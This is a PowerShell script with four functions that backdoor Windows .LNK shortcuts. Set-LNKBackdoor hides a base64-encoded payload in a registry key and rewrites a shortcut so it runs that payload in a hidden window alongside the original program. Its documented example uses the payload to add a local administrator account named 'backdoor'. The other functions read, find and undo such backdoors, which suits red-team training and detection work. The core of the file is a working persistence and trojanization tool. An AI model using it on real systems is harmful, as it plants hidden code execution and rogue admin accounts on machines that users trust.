function Set-LNKBackdoor {
<#
    .SYNOPSIS
    
        Backdoors an existing .LNK shortcut to trigger the original binary and a payload specified by
        -ScriptBlock or -Command.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This function will take the path to an existing .LNK file and backdoor it to launch a specified payload
        along with the original binary. It uses a WScript.Shell COM object to manipulate the shortcut,
        building a small cradle that uses [System.Diagnostics.Process]::Start() to launch the original
        $LNK.TargetPath binary, and then decode a base64-encoded PowerShell payload that's stored in the
        registry at -RegPath (to avoid length restrictions).

        If a PowerShell -ScriptBlock is passed as the payload argument, the scriptblock is ASCII 
        base64-encoded and used. If a PowerShell -Command is passed, the string is base64-encoded if 
        it is not already and that is used instead.

    .PARAMETER Path

        The full path to an existing .LNK.

    .PARAMETER ScriptBlock

        A PowerShell scriptblock to trigger for the payload.

    .PARAMETER Command

        A string of PowerShell code to trigger for the payload.

    .PARAMETER RegPath

        The registry path in HKCU/HKLM to store the encoded payload.

    .EXAMPLE

        PS C:\Users\localadmin\Desktop> Set-LNKBackdoor -Path .\dnSpy.lnk -Command 'net user backdoor Password123! /add && net l
        ocalgroup Administrators backdoor /add'


        WorkingDirectory : C:\StudentResources\dnSpy
        IconLocation     : ,0
        LaunchString     : [System.Diagnostics.Process]::Start('C:\StudentResources\dnSpy\dnSpy.exe');IEX
                           ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows
                           debug).debug)))
        RegBase64Payload : bmV0IHVzZXIgYmFja2Rvb3IgUGFzc3dvcmQxMjMhIC9hZGQgJiYgbmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgYmFja2Rv
                           b3IgL2FkZA==
        Path             : C:\Users\localadmin\Desktop\dnSpy.lnk
        LaunchCommand    : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcA
                           bgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBDADoAXABTAHQAdQBkAGUAbgB0AFIAZQBz
                           AG8AdQByAGMAZQBzAFwAZABuAFMAcAB5AFwAZABuAFMAcAB5AC4AZQB4AGUAJwApADsASQBFAFgAIAAoAFsAVABlAHgAdAAuAEUA
                           bgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBG
                           AHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABnAHAAIABIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkA
                           YwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABkAGUAYgB1AGcAKQAuAGQAZQBiAHUAZwApACkAKQA=
        RegPath          : HKCU:\Software\Microsoft\Windows\debug


        Stores a base64-encoded representation of the passed -Command into HKCU:\Software\Microsoft\Windows\debug
        and sets the shortcut at C:\Users\localadmin\Desktop\dnSpy.lnk to launch the original
        dnSpy binary and then decode/trigger the registry payload.

    .LINK

        http://windowsitpro.com/powershell/working-shortcuts-windows-powershell
        http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
        https://github.com/samratashok/nishang
        http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/
#>
    [CmdletBinding(DefaultParameterSetName = 'ScriptBase64')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $Path,

        [Parameter(Position = 1, Mandatory = $True, ParameterSetName = 'ScriptBlock')]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 1, Mandatory = $True, ParameterSetName = 'ScriptBase64')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Parameter(Position = 2)]
        [ValidatePattern('^[HKCU|HKLM]:\\.*')]
        [String]
        $RegPath = 'HKCU:\Software\Microsoft\Windows\debug'
    )

    if ($PSBoundParameters['ScriptBlock']) {
        $Base64Script = [Convert]::ToBase64String(([Text.Encoding]::ASCII).GetBytes($ScriptBlock))
    }
    else {
        # check if the command passed is already base64-encoded
        if($Command -match '^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$') {
            $Base64Script = $Command
        }
        else {
            $Base64Script = [Convert]::ToBase64String(([Text.Encoding]::ASCII).GetBytes($Command))
        }
    }

    $RegParts = $RegPath.Split('\')
    $RegistryPayloadPath = $RegParts[0..($RegParts.Count-2)] -join '\'
    $RegistryPayloadKey = $RegParts[-1]

    # create a COM object for the LNK
    $Obj = New-Object -ComObject WScript.Shell
    $LNKPath = (Resolve-Path -Path $Path).Path
    $LNK = $Obj.CreateShortcut($LNKPath)

    # save off the old .LNK parameters
    $OriginalTargetPath = $LNK.TargetPath
    $OriginalWorkingDirectory = $LNK.WorkingDirectory
    $OriginalIconLocation = $LNK.IconLocation

    # store the encoded script into the specified registry key
    $Null = Set-ItemProperty -Force -Path $RegistryPayloadPath -Name $RegistryPayloadKey -Value $Base64Script

    # trojanize in our new link arguments
    $LNK.TargetPath = "${Env:SystemRoot}\System32\WindowsPowerShell\v1.0\powershell.exe"

    # set the .LNK to launch the original binary path first before our functionality
    $LaunchString = "[System.Diagnostics.Process]::Start('$OriginalTargetPath');IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp $RegistryPayloadPath $RegistryPayloadKey).$RegistryPayloadKey)))"

    $LaunchBytes  = [System.Text.Encoding]::UNICODE.GetBytes($LaunchString)
    $LaunchB64 = [System.Convert]::ToBase64String($LaunchBytes)

    $LNK.Arguments = "-nop -enc $LaunchB64"

    # make sure to match the old working directory
    $LNK.WorkingDirectory = $OriginalWorkingDirectory
    $LNK.IconLocation = "$OriginalTargetPath,0"
    $LNK.WindowStyle = 7 # hidden
    $LNK.Save()

    $Properties = @{
        'Path' = $LNKPath
        'RegPath' = $RegPath
        'RegBase64Payload' = $Base64Script
        'WorkingDirectory' = $OriginalWorkingDirectory
        'LaunchString' = $LaunchString
        'LaunchCommand' = "$($LNK.TargetPath) $($LNK.Arguments)"
        'IconLocation' = $OriginalIconLocation
    }
    New-Object -TypeName PSObject -Property $Properties
}


function Get-LNKBackdoor {
<#
    .SYNOPSIS
    
        Retrieves LNK backdoor information for a specified LNK modified by Set-LNKBackdoor.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This function will take the path to a .LNK backdoored by Set-LNKBackdoor and extract out relevant
        LNK information from the properties in the .LNK.

    .EXAMPLE

        PS C:\Users\localadmin\Desktop> Get-LNKBackdoor .\dnSpy.lnk


        WorkingDirectory : C:\StudentResources\dnSpy
        IconLocation     : C:\StudentResources\dnSpy\dnSpy.exe,0
        LaunchString     : [System.Diagnostics.Process]::Start('C:\StudentResources\dnSpy\dnSpy.exe');IEX
                           ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows
                           debug).debug)))
        RegBase64Payload : bmV0IHVzZXIgYmFja2Rvb3IgUGFzc3dvcmQxMjMhIC9hZGQgJiYgbmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgYmFja2Rv
                           b3IgL2FkZA==
        Path             : C:\Users\localadmin\Desktop\dnSpy.lnk
        LaunchCommand    : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcA
                           bgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBDADoAXABTAHQAdQBkAGUAbgB0AFIAZQBz
                           AG8AdQByAGMAZQBzAFwAZABuAFMAcAB5AFwAZABuAFMAcAB5AC4AZQB4AGUAJwApADsASQBFAFgAIAAoAFsAVABlAHgAdAAuAEUA
                           bgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBG
                           AHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABnAHAAIABIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkA
                           YwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABkAGUAYgB1AGcAKQAuAGQAZQBiAHUAZwApACkAKQA=
        RegPath          : HKCU:\Software\Microsoft\Windows\debug
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [ValidatePattern('^.*\.lnk$')]
        [Alias('FullName')]
        [String[]]
        $Path
    )

    PROCESS {
        ForEach($TargetPath in $Path) {

            $TargetPath = (Resolve-Path -Path $TargetPath).Path

            # create a COM object for the LNK
            $Obj = New-Object -ComObject WScript.Shell
            $LNK = $Obj.CreateShortcut($TargetPath)

            $Index = $LNK.Arguments.IndexOf('-enc')

            if($Index -ne -1) {

                $EncodedCommand = $LNK.Arguments.SubString($Index + 5)

                $LaunchString = ([Text.Encoding]::UNICODE).GetString([Convert]::FromBase64String($EncodedCommand))

                $RegistryPaths = $LaunchString.SubString($LaunchString.IndexOf('gp HK')).Split(' ')
                $RegistryPayloadPath = $RegistryPaths[1]
                $RegistryPayloadKey = $RegistryPaths[2].split(')')[0]

                $RegBase64Payload = (Get-ItemProperty -Path $RegistryPayloadPath -Name $RegistryPayloadKey).$RegistryPayloadKey

                $Properties = @{
                    'Path' = $TargetPath
                    'RegPath' = "$RegistryPayloadPath\$RegistryPayloadKey"
                    'RegBase64Payload' = $RegBase64Payload
                    'WorkingDirectory' = $LNK.WorkingDirectory
                    'LaunchString' = $LaunchString
                    'LaunchCommand' = "$($LNK.TargetPath) $($LNK.Arguments)"
                    'IconLocation' = $LNK.IconLocation
                }
                New-Object -TypeName PSObject -Property $Properties
            }
        }
    }
}


function Remove-LNKBackdoor {
<#
    .SYNOPSIS
    
        Removes the LNK backdoor for a specified LNK modified by Set-LNKBackdoor.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This function will take the path to a .LNK backdoored by Set-LNKBackdoor, extract out relevant
        LNK information with Get-LNKBackdoor, will restore the original $LNK.TargetPath, and will remove
        the registry payload.

    .EXAMPLE

        PS C:\> Remove-LNKBackdoor -LNKPath C:\Users\john\Desktop\Firefox.lnk

        Remove the registry payload and restore the original shortcut executable path.
    
    .EXAMPLE

        PS C:\Users\localadmin\Desktop> Get-Item .\dnSpy.lnk | Get-LNKBackdoor | Remove-LNKBackdoor -Verbose
        VERBOSE: Removing registry payload from HKCU:\Software\Microsoft\Windows\debug
        VERBOSE: Restoring original LNK path to C:\StudentResources\dnSpy\dnSpy.exe

        Remove the registry payload and restore the original shortcut executable path.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [ValidatePattern('^.*\.lnk$')]
        [Alias('FullName')]
        [String[]]
        $Path
    )

    PROCESS {
        ForEach($TargetPath in $Path) {

            $TargetPath = Resolve-Path -Path $TargetPath
            $Obj = New-Object -ComObject WScript.Shell
            $LNK = $Obj.CreateShortcut($TargetPath)

            $LNKObject = Get-LNKBackdoor -Path $TargetPath
            $OriginalPath = $LNKObject.LaunchString.split("'")[1]

            if($OriginalPath -and ($OriginalPath.Trim() -ne '') ) {
                $RegPath = $LNKObject.RegPath
                $RegParts = $RegPath.Split('\')
                $RegistryPayloadPath = $RegParts[0..($RegParts.Count-2)] -join '\'
                $RegistryPayloadKey = $RegParts[-1]

                Write-Verbose "Removing registry payload from $RegPath"
                try {
                    $Null = Remove-ItemProperty -Force -Path $RegistryPayloadPath -Name $RegistryPayloadKey -ErrorAction Stop
                }
                catch {
                    Write-Warning "Error removing registry payload from $RegPath : $_"
                }

                Write-Verbose "Restoring original LNK path to $OriginalPath"
                $LNK.TargetPath = $OriginalPath
                $LNK.Arguments = $Null
                $LNK.WindowStyle = 1
                $LNK.Save()                
            }
            else {
                Write-Warning "OriginalPath is empty."
            }
        }
    }
}


function Find-LNKBackdoor {
<#
    .SYNOPSIS
    
        Finds all .LNKs backdoored with Set-LNKBackdoor.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This function will search for all .LNK files in the specified path (default of C:\Users\)
        and will retrieve the LNK information with Get-LNKBackdoor. If any $LNK.LaunchCommand paths
        match 'powershell.exe -nop -enc' the LNK description object is output.

    .EXAMPLE

        PS C:\> Find-LNKBackdoor


        WorkingDirectory : C:\StudentResources\dnSpy
        IconLocation     : C:\StudentResources\dnSpy\dnSpy.exe,0
        LaunchString     : [System.Diagnostics.Process]::Start('C:\StudentResources\dnSpy\dnSpy.exe');IEX
                           ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows
                           debug).debug)))
        RegBase64Payload : bmV0IHVzZXIgYmFja2Rvb3IgUGFzc3dvcmQxMjMhIC9hZGQgJiYgbmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgYmFja2Rv
                           b3IgL2FkZA==
        Path             : C:\Users\localadmin\Desktop\dnSpy.lnk
        LaunchCommand    : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcA
                           bgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBDADoAXABTAHQAdQBkAGUAbgB0AFIAZQBz
                           AG8AdQByAGMAZQBzAFwAZABuAFMAcAB5AFwAZABuAFMAcAB5AC4AZQB4AGUAJwApADsASQBFAFgAIAAoAFsAVABlAHgAdAAuAEUA
                           bgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBG
                           AHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABnAHAAIABIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkA
                           YwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABkAGUAYgB1AGcAKQAuAGQAZQBiAHUAZwApACkAKQA=
        RegPath          : HKCU:\Software\Microsoft\Windows\debug

    .EXAMPLE

        PS C:\> Find-LNKBackdoor | Remove-LNKBackdoor

        Finds all backdoored LNK files on the system and restores the original LNK functionality.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path = @("$($Env:WinDir | Split-Path -Qualifier)\Users\")
    )

    PROCESS {
        ForEach($SearchPath in $Path) {
            # find all .LNK files in the specified search paths
            Get-ChildItem -Path $SearchPath -Recurse -Force -Include @('*.lnk') -ErrorAction SilentlyContinue | ForEach-Object {
                $LNK = Get-LNKBackdoor -Path $_
                if($LNK.LaunchCommand -match 'powershell\.exe -nop -enc') {
                    $LNK
                }
            }
        }
    }
}
